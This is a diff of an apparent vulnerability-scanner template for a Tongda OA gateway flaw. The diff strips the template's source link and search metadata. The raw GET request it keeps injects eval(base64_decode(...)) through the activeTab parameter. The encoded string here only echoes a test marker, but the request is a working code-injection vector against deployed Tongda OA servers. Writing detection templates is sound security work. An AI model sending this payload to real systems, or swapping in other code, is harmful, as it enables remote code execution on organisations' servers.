@@ -3,14 +3,8 @@ info:
   name: 通达OAgateway存在前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2d3396e4fc71b41d9aab216e65dffcd3
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 2d3396e4fc71b41d9aab216e65dffcd3
-    fofa: + hunter`app.name="通达 OA"`
 http:
 - raw:
   - 'GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1
